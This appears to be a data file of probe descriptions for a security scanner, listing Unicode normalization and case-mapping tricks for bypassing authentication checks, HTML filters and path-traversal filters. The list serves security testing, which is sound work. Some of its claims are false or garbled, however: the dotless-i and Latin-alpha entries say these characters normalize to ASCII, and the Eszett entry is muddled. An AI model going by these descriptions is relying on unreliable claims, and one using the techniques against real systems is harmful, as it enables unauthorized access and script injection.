auth_bypass.description: Unicode normalization bypass in authentication -- NFKC/NFC normalization collapses look-alike characters to ASCII equivalents after validation but before lookup

probes.description: Turkish dotless-i bypass -- 'Admın' (dotless i U+0131) normalizes to 'admin' under NFKC in some locales
Latin alpha bypass -- 'ɑdmin' (U+0251 Latin Small Letter Alpha) may normalize to 'admin'
Fullwidth 'admin' -- fullwidth Latin letters (U+FF41..U+FF4E) normalize to ASCII under NFKC

filter_bypass.description: Unicode normalization to bypass input filters -- fullwidth or confusable characters pass blacklist then normalize to blocked characters

probes.description: Fullwidth angle brackets -- U+FF1C (<) and U+FF1E (>) bypass HTML filters, may normalize to ASCII after validation
Fullwidth img tag -- fullwidth < and > bypass filter, normalize to valid HTML after sanitization
One-dot leader path traversal -- U+2024 (ONE DOT LEADER) normalizes to period, bypassing ../ filters

case_mapping.description: Unicode case mapping tricks -- special characters that change length or value during case conversion

probes.description: German Eszett expansion -- U+00DF (ss) expands to 'ss' on uppercase then back to 'ss' on lowercase, may collide with 'admiss' or bypass length checks
Combining dot above -- U+0307 added to 'I' causes locale-dependent case mapping (Turkish i/I with dot)
